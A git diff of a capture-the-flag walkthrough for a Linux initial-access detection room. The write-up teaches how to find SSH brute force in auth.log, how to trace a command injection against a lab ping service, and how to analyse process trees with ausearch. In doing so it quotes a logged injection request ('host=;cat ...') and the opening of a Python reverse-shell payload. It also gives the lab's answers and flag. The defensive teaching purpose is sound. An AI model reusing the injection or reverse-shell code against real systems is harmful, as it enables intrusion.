@@ -30,25 +30,31 @@ However it can be used by attackers to gain access to our systems.
 
 There are two common ways in which you can connect remotely via SSH: Password Authentication and SSH Key-Based Authentication
 * Password Authentication is what we are mostly used to: username and password. We send to the ip address we are logging to the user we want to log into, and the password. If there is an ssh server configured, and if our credentials are correct, then we will be able to remotely log into our system.
-  Password Autentication Syntax: ssh [user]@[ip address], you will then be prompted for the password
-
+<br />
+Password Autentication Syntax: ssh [user]@[ip address], you will then be prompted for the password
+<br />
 * SSH Key-Based Authentication is also known as Passwordless authentication because it relies on keys. There are two keys: Public key and Private key. The public key is for the server and the private key is for the client. In other words, the Public key is kept on the system you want to log into remotely, and the private key is kept on the system you are using to connect remotely. This is a passwordless method because it doesnt really on a password to prove an identity, rather, the cleint proves it owns the Private Key in order to gain connection. Key-Based Authentication is nearly impossible to brute force, making it safer than Password Authentication. However if someone obtains a copy of your Private Key, then your system is compromised. That is why it is best practice to add a passphrase to the Private Key to add an additional layer of defence.
-  Passwordless Authentication Syntax: ssh [user]@[ip address], unlike above, you will not be prompted by the password.
+<br />
+Passwordless Authentication Syntax: ssh [user]@[ip address], unlike above, you will not be prompted by the password.
 <br />
 Hopefully this was usefull reminder of how ssh works!
 
+<br/>
 With this information, we can see that we need to look out for:
-  Weak Passwords in Password Authentication and access to our Private Key File
+<br />
+Weak Passwords in Password Authentication and access to our Private Key File
 
 <h3>Questions:</h3>
 <h4>Question 1 - When did the ubuntu user log in via SSH for the first time?</h4>
+<br />
 Answer Example: 2023-09-16.
-
+<br />
 We need to remember that from the previous room that the way we look for authentication events is through the auth.log logs
 
 <img width="1382" height="401" alt="Screenshot 2026-04-04 at 7 07 37 PM" src="https://github.com/user-attachments/assets/2acde9c9-d0a1-465a-b856-58c5d4bf22b0" />
 
 However this is to much information and going through it line by line will take forever, hence we will use the grep tool.
+<br />
 In order for the grep tool to be useful we need to know keywords to help us find what we are looking for.
 
 Since we are looking for a succesful ssh log in, we grep for the keywords "ssh" and "Accept" since you find these words on log entries that log succesful ssh logins.
@@ -58,10 +64,12 @@ You will see here that the first entry doesnt have the year, however by doing fu
 <img width="1423" height="315" alt="Screenshot 2026-04-04 at 7 17 48 PM" src="https://github.com/user-attachments/assets/91e2a16e-ad1c-49d2-a9f5-00ece379dd90" />
 
 Something that was confusing for me is that how did the format change. If you grep for SSH logs, you can see that the SSH Servce (SSHD) restarted. When SSHD restarted, it could be that the logging system changed. 
+<br />
 The "Oct 22 08:55:25" logs follow the standard syslog timestamp format typical of the rsyslog system, while the later entries with the year and more accurate time use ISO 8601 format, which is typical of journald. Basically the way logs were processed changed.
 <br />
 Hope you found this helpful.
 <img width="1422" height="311" alt="Screenshot 2026-04-04 at 7 21 57 PM" src="https://github.com/user-attachments/assets/93adaa7c-44c4-4c7c-9840-f90c36909d98" />
+
 <h5>Answer: 2024-10-22</h5>
 
 <h4>Question 2 - Did the ubuntu user use SSH keys instead of a password for the above found date? (Yea/Nay)</h4>
@@ -77,6 +85,7 @@ We have seen how a sucessful SSH login looks like. Now, we will learn how to det
 The key to figure out is by looking at the context and correlation of other logs.
 
 In the figured labeled Successful SSH Logins. With the ansible login, we can see that she used a key, which as we have seen is safer than using a password method. You can also analyze that the login was made from an internal ip address.
+<br />
 However, with the other logs for jsmith, we can analyze that a password authentication and an external ip address was used which raises a red flag.
 
 We will practice this answering the questions on this task.
@@ -86,19 +95,19 @@ We will practice this answering the questions on this task.
 Answer Format: 2023-09-15.
 
 This question tells us that we are analyzing an SSH brute force attack.
-
+<br />
 To recap, a brute force attack is an authentication attack where an attacker attempts to gain access by systematically trying multiple password combinations. This attack typically happens in an automated manner.
-
+<br />
 Brute force attacks can be identified in logs by:
 * Repeated failed login attempts within a short period of time
 * Multiple authentication attempts originating from the same IP address
 * Attempts targeting one or multiple user accounts
 * High-frequency login attempts indicating automation
-
+<br />
 With this in mind, we now know what we are looking for.
-
+<br />
 To analyze the logs, remember we will need to look at the auth.log logs since we are looking for authorization and authentication activity.
-
+<br />
 Since a characteristic of a brute force attack is a lot of failed login attempts, let us grep for "failed"
 
 <img width="1421" height="726" alt="Screenshot 2026-04-05 at 1 28 38 PM" src="https://github.com/user-attachments/assets/86d031c0-8b0a-48cc-ba62-261f4b831eb3" />
@@ -110,185 +119,205 @@ We can see that there is a Failed Password attempt from 197.39.195.136, but the 
 <h5>Answer: 2025-08-21</h5>
 
 <h4>Question 2 - Which four users did the botnet attempt to breach?</h4>
+<br />
 Answer Format: Separate by a comma, in alphabetical order.
 
 From this question we can see that the system is being attacked by a botnet, meaning that the attacker is using multiple ip addresses to brute force.
-
+<br />
 Looking at the results again
 <img width="1424" height="729" alt="Screenshot 2026-04-05 at 1 36 20 PM" src="https://github.com/user-attachments/assets/e383bcfd-105f-4e53-a5ca-6c0af1edfb76" />
 
 We see that the ip address 193.46.255.33 was trying to access user root multiple times in a short amount of time.
+<br />
 We can add the user "root" to our list
-
+<br />
 We also notice that same ip address accessing user sol. Even though there was only one attempt, from the analysis we can conclude that the ip address is part of the botnet.
 We can the user "sol" to the list.
-
+<br />
 We also see that the 80.94.95.112 is making multiple attempts to the same user (roy) in a short ammount of time.
 We will add "roy" to the list.
-
+<br />
 Looking at the later events
 <img width="1418" height="725" alt="Screenshot 2026-04-05 at 2 06 13 PM" src="https://github.com/user-attachments/assets/139c36c1-748f-48fc-9523-bcf39b71fe67" />
-
+<br />
 We can see 80.94.95.112 is making multiple attempts to the user user in a short ammount of time.
+<br />
 We will add "user" to the list
-
+<br />
 We have found our four users
-
+<br />
+<br />
 <h5>Answer: root, roy, sol, user</h5>
 
 <h4>Question 3 - Finally, which IP managed to breach the root user?</h4>
 We know of two ip addresses part of the botnet attack: 193.46.255.33 and 80.94.95.112.
-
+<br />
 We will now filter through the auth.log to look for a sucessul login to the root user from one of these ip addresses
-
+<br />
 <img width="1168" height="71" alt="Screenshot 2026-04-05 at 3 41 27 PM" src="https://github.com/user-attachments/assets/7273e9a8-f91a-47ef-afc9-f781d4abcaae" />
-
+<br />
 Even though that the ip address is not part of the initial 2 ip addresses we identified as part of the botnet, looking back at the logs we can see the participation of the 91.224.92.79 address in the botnet.
-
+<br />
 I ran the same command as in question 2 of this same task: 
+<br />
 cat /var/log/auth.log | grep "ssh" | grep -i "failed"
 <img width="1421" height="177" alt="Screenshot 2026-04-05 at 3 46 37 PM" src="https://github.com/user-attachments/assets/b0d2bebe-63ac-46db-b4b6-601c9c41e86b" />
-
+<br />
+<br />
 <h5>Answer: 91.224.92.79</h5>
-
+<br />
 <h2>Task 4 - Initial Access via Services</h2>
-
+<br />
 Not only do attackers use SSH to gain initial access to your system. but also through services.
+<br />
 In order to check for a potential, we are going to have to analyze logs related to our services, like our web servers.
-
+<br />
 In the example of the image, TryPingMe Web Logs, we can see that our web server is vulnerable for command injection. Command injection is a vulnerability where an attacker can execute commands on a server because user input is improperly handled. The attacker was able to run linux commands like whoami, hello, and ls in the web server. The attacker shouldn't be able to run these commands. The backend was not coded safely in order to sanitize the user input which an attacker can exploit and gain initial access.
-
+<br />
 For the questions, we are going to analyze TryPingMe web logs. It seems like TryPingMe is running on a nginx web server. To analyze then the logs, we will find them in /var/log/nginx/access.log
-
+<br />
 <h3>Questions:</h3>
 <h4>Question 1 - What is the path to the Python file the attacker attempted to open?</h4>
 We are told in the question we are looking for a python file. Python files have an extension of .py, so let us search for ".py" in the access.log
-
 <img width="1417" height="136" alt="Screenshot 2026-04-05 at 5 16 00 PM" src="https://github.com/user-attachments/assets/8d809781-39bf-4ad3-a2b9-740e1c702a46" />
-
+<br />
 From the first entry, we can see that there was a GET command for a main.py file.
+<br />
 GET /ping?host=;cat+/opt/trypingme/main.py HTTP/1.1" 200 330 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
-
+<br />
 A quick recap on URI:
 * GET - is the HTTP request method. This method indicates that the client is requesting something from the server
 * /ping - is the endpoint the client accessed.
 * ? - declares that the following are parameters, like variables, that the client can set, in this case the parameter that was set is host
 Host will have a value equal to ";cat+/opt/trypingme/main.py"
-
+<br />
 The most likely use of the backend code is "ping <host>".
 For example the user would write 8.8.8.8, the URI looks like "/ping?host=8.8.8.8" and the code looks like "ping 8.8.8.8"
-
+<br />
 However in this case we have ";cat+/opt/trypingme/main.py". The ";" closes the ping command and introduces the cat command wanting to access read the /opt/trypingme/main.py
+<br />
 The + symbol represents a space in URI encoding.
-
+<br />
 The attacker is trying to access /opt/trypingme/main.py
-
+<br />
+<br />
 <h5>Answer: /opt/trypingme/main.py </h5>h5>
-
+<br />
 <h4>Question 2 - Looking inside the opened file, what's the flag you see there?</h4>
+<br />
 We now need to find the file /opt/trypingme/main.py.
-
+<br />
 If we simply cat the file we get our answer.
-
+<br />
 <img width="582" height="616" alt="Screenshot 2026-04-05 at 5 26 42 PM" src="https://github.com/user-attachments/assets/687ea964-658a-4f30-b47b-33f04d645c70" />
-
+<br />
 This question is pretty simple. It could be confusing in where to start to look for the file. We know that the file is in /opt/trypingme/main.py. We can start by using the cat command directly first. 
-
+<br />
+<br />
 <h5>Answer: THM{i_am_vulnerable!}</h5>
-
+<br />
 <h2>Task 5 - Detecting Service Breach</h2>
+<br />
 This task focuses on learning to use process analysis in order to analyze an attacker's potential initial access.
+<br />
 Application logs are not always available, it best to rely on process tree analysis.
 A process tree is a hierarchical view of how process started (spawned) which other process.
 This relationship is often described as a parent / child relationship that when you zoom out and see the whole relationships formed, it looks like a family tree, hence the name the process tree.
-
+<br />
 We will use ausearch to look through audit daemon logs we looked at the previous room where it focuses on analyzing system calls.
+<br />
 Two values of a audit log file is: PROCTITLE AND SYSCALL
+<br />
 The PROCTITLE and SYSCALL records represent the same process execution event. 
 * The PROCTITLE provides the human-readable command that a user wrote
 * The SYSCALL entry shows the underlying system call (execve) used to execute that command, along with metadata such as process ID, user, and execution status.
 The SYSCALL entry includes the parent process ID (ppid), which identifies the process that spawned the current process.
+<br />
 We can learn why a process is running from analyzing the parent process.
-
+<br />
 We will use ausearch to look through the audit logs
-
+<br />
 <h3>Questions:</h3>
 <h4>Question 1 - What is the PPID of the suspicious whoami command?</h4>
-
-in order to answer this question, we are given a keyword we can look for: "whoami".
+<br />
+In order to answer this question, we are given a keyword we can look for: "whoami".
 We can run the command: ausearch -i -x "whoami"
-  where the i flag gives you human readable output, and the x flag lets you search for the executabl name.
-
+<br />  
+where the i flag gives you human readable output, and the x flag lets you search for the executabl name.
+<br />
 <img width="1424" height="225" alt="Screenshot 2026-04-05 at 5 48 23 PM" src="https://github.com/user-attachments/assets/6b9007d9-ed89-4df7-90b4-8674b8bbdd34" />
 
 From the picture, we can see the the ppid is 1018
-
+<br />
+<br />
 <h5>Answer: 1018</h5>
-
+<br />
 <h4>Question 2 - Moving up the tree, what is the PID of the TryPingMe app?</h4>
-
 We know that the user used the TryPingMe app in order to get to inject his own commands. In order to find the id of trypingme we can go up the process tree similar to the example THM provided.
-
 <img width="1253" height="382" alt="Screenshot 2026-04-05 at 5 50 05 PM" src="https://github.com/user-attachments/assets/22c8fca0-cfaa-4b72-9036-60c8b4a8cf53" />
-
+<br />
 I continue going up the tree until I reach the TryPingMe app process.
-
 <img width="1427" height="609" alt="Screenshot 2026-04-05 at 5 56 56 PM" src="https://github.com/user-attachments/assets/0d454582-6700-4906-9fbc-47aceb9139c5" />
-
+<br />
 How do you know that is the app process?
+<br />
 The proctitle shows /usr/bin/python3 /opt/trypingme/main.py, meaning the Python interpreter (exe=/usr/bin/python3.12) is executing the application’s main script located under /opt/trypingme. This indicates that this process represents the application runtime rather than a child or auxiliary process.
-
+<br />
 Using -x trypingme will not work because the -x flag filters on the executable (exe field) from the SYSCALL event. In this case, the executable is /usr/bin/python3.12, not trypingme. Therefore, you would need to use -x /usr/bin/python3.12, but this may return many unrelated results since multiple scripts can be executed by the Python interpreter.
-
+<br />
 An interpreter is a program that translates and executes code line by line at runtime, converting it into machine instructions as it runs. This is what is making your code execute, run.
-
+<br />
+<br />
 <h5>Answer: 577</h5>
-
+<br />
 <h4>Question 3 - Which program did the attacker use to open a reverse shell?</h4>
-
+<br />
 We know that the attacker used TryPingMe to gain access to the system. Let us then analyze what are the child processes of the TryPingMe process by using the following command: 
 ausearch -i --ppid 577
-
+<br />
 <img width="1423" height="183" alt="Screenshot 2026-04-05 at 6 20 03 PM" src="https://github.com/user-attachments/assets/2dfd1b2e-9fbc-4b8c-9812-af8facbd7646" />
-
+<br />
 In the last entry, we see the following command in the proctitle: import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.
-
+<br />
 This is the beginning of a Python reverse shell payload:
 * It imports socket which is used to create a connection
 * SOCK_STREAM indicates the creation of a TCP connection
 * s.connect(("10.x.x.x", PORT)) is the connection to an IP.
-
+<br />
 In fact, we can see the full command in the image in Task 4, Question 1.
-
+<br />
+<br />
 <h5>Answer: Python</h5>
-
+<br />
 <h2>Task 6 - Advanced Initial Access</h2>
-
+<br />
 THM teaches that even though it is not as common for phishing and USB attacks to be succesful compared to windows, we still need to be aware of it.
-
+<br />
 Supply chain compromise is also a common initial access technique, where an attacker targets software or services that are distributed to multiple downstream clients. By compromising a trusted vendor or update mechanism, the attacker can propagate malicious code to many organizations simultaneously.
-
+<br />
 A well-known example is the Stuxnet attack, in which attackers weaponized legitimate software updates. Organizations that trusted and installed the update were unknowingly compromised.
-
+<br />
 In order to detect these attack, we need to analyze the process tree.
-
+<br />
 <h3>Questions:</h3>
 <h4>Question 1 - Which Initial Access technique is likely used if a trusted app suddenly runs malicious commands?</h4>
 This is a Supply Chain Compromise. Trusted apps were compromised to run malicious code.
-
+<br />
+<br />
 <h5>Answer: Supply Chain Compromise</h5>
-
+<br />
 <h4>Question 2 - Which detection method can you use to detect a variety of Initial Access techniques?</h4>
-
+<br />
+<br />
 <h5>Answer: Process Tree Analysis</h5>
-
+<br />
 <h2>Conclusion</h2>
-
+<br />
 In this room we learened:
 * Analysis on authentication logs looking for initial access through services and ssh
 * Process Tree Analysis
 * Advanced Initial Access Techniques
-  
+<br />
 Hope this walkthrough was helpful!
 On to the next room!
 
